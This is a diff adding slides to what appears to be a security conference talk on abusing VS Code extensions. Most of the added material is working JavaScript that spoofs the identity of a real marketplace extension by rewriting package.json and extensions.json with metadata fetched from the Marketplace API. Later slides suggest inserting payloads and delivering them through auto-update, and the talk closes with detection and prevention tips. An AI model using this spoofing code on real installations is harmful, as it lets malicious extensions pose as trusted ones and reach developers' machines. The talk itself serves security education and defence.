@@ -2149,9 +2149,172 @@ layout: image-left
 image: https://render.fineartamerica.com/images/rendered/default/print/8/5.5/break/images/artworkimages/medium/2/thinking-cat-douglas-sacha.jpg
 ---
 
-# What if we?
+# What if we create an extension which:
 
-- Read the current package.json 
-- Make a POST request to Marketplace API with the target extension 
-- Update package.json
-- Update extensions.json
+- Reads the current package.json 
+- Makes a POST request to Marketplace API with the target extension 
+- Updates package.json
+- Updates extensions.json
+
+---
+---
+
+```js {1-4|5-7|8-10|11-16|17-20|21-57|58-70|71-73|74-} {maxHeight:'440px'}
+// Importing stuff we need
+const fs = require("fs");
+const path = require("path");
+const os = require("os");
+
+// Function which would "spoof" our extension
+async function updateExtension() {
+  // Name and publisher of the extension we wanna spoof
+	let new_publisher = "ms-vscode";
+	let new_name = "live-server";
+
+  // Read the current extension's package.json to get the required fields
+	const packageJsonPath = path.join(__dirname, "./package.json");
+	const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, "utf8"));
+	const old_name = packageJson.name;
+	const old_publisher = packageJson.publisher? packageJson.publisher: "undefined_publisher";
+
+  // Reading extensions.json to get the other required values
+	const extensionsJsonPath = path.join(__dirname, "..", "./extensions.json");
+	const extensions = JSON.parse(fs.readFileSync(extensionsJsonPath, "utf8"));
+
+	const queryValue = `${new_publisher}.${new_name}`;
+	const response = await fetch(
+		"https://marketplace.visualstudio.com/_apis/public/gallery/extensionquery",
+		{
+			method: "POST",
+			headers: {
+				"Content-Type": "application/json",
+				Accept: "application/json;api-version=7.1-preview.1",
+				"User-Agent": "VSCode",
+			},
+			body: JSON.stringify({
+				filters: [
+				{
+					criteria: [{ filterType: 7, value: queryValue }],
+					pageSize: 1,
+					pageNumber: 1,
+					sortBy: 0,
+					sortOrder: 0,
+				},
+				],
+					assetTypes: [],
+					flags: 950,
+			}),
+		}
+	);
+
+	if (!response.ok) {
+		throw new Error(`Marketplace request failed: ${response.status} ${response.statusText}`);
+	}
+
+	const marketplaceData = await response.json();
+
+	const extension = marketplaceData?.results?.[0]?.extensions?.[0];
+	if (!extension) {
+		throw new Error("No extension found in marketplace response");
+	}
+
+  // Get the information we need from the response json and update the entries as required
+	const extensionId = extension.extensionId;
+	const publisherId = extension.publisher?.publisherId;
+	const publisherDisplayName = extension.publisher?.displayName;
+	const latestVersion = extension.versions?.[0]?.version;
+
+	packageJson.name = new_name;
+	packageJson.publisher = new_publisher;
+	packageJson.displayName = extension.displayName;
+	if (latestVersion) {
+		packageJson.version = latestVersion;
+	}
+
+  // Update package.json with the entry data
+	fs.writeFileSync(packageJsonPath, JSON.stringify(packageJson, null, 2));
+
+  // Replace the value in extensions.json
+	const oldId = `${old_publisher}.${old_name}`;
+	const newId = `${new_publisher}.${new_name}`;
+
+  // Find the entry in extensions.json and update it
+	const entry = extensions.find((e) => e?.identifier?.id === oldId);
+	if (!entry) {
+	throw new Error(`No entry found in extensions.json with id "${oldId}"`);
+	}
+
+	entry.identifier.id = newId;
+	// Update version
+	if (latestVersion) {
+	entry.version = latestVersion;
+	}
+
+	if (!entry.metadata) entry.metadata = {};
+
+	entry.metadata.source = "gallery";
+	entry.metadata.id = extensionId;
+
+	if (publisherId) {
+	entry.metadata.publisherId = publisherId;
+	}
+
+	if (publisherDisplayName) {
+	entry.metadata.publisherDisplayName = publisherDisplayName;
+	}
+
+	fs.writeFileSync(extensionsJsonPath, JSON.stringify(extensions, null, 2));
+}
+```
+
+---
+layout: center
+---
+
+<video
+  controls
+  src="./imgs/poc.mov"
+  type="video/quicktime"
+  style="width: 100vw; height: 100vh; object-fit: contain; position: fixed; top: 0; left: 0; background: black; z-index: 9999;"
+  onclick="if(this.requestFullscreen) this.requestFullscreen(); else if(this.webkitRequestFullscreen) this.webkitRequestFullscreen();"
+/>
+
+---
+layout: center
+---
+
+# There is so much more you can do!
+
+- Spoof extensions
+- Insert payloads into other extensions
+- Use auto update to deliver payloads!
+
+---
+layout: center
+---
+
+# Detections and IOCs
+
+- Visual Cues like mismatching names
+- Loading a `.node` file is really suspicious (major IoC)
+- Installing extensions from VSIX files directly is a red flag
+- All the detections applicable to DLLs, apply to Addon files as well
+
+<br />
+
+# Prevention
+
+- Prevent loading of extensions from disk
+- Do a signature check of all commonly used extension
+- Keep a white list of well audited extensions from both OpenVSX and Visual Studio Marketplace
+- Maintain a SBOM (Software Bill of Materials) to monitor for any discovered vulnerabilities
+
+---
+layout: image
+image: https://img.magnific.com/free-vector/flat-design-end-screen-background_23-2150998486.jpg?semt=ais_hybrid&w=740&q=80
+backgroundSize: contain
+---
+
+
+
+---
